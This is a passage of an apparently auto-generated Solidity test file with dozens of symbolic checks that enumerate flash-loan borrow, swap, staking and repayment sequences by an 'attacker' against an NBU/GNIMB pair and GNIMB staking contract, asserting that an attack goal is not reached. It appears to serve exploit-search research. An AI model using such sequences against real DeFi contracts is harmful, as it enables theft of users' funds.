        vm.stopPrank();
    }

    function check_cand2175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
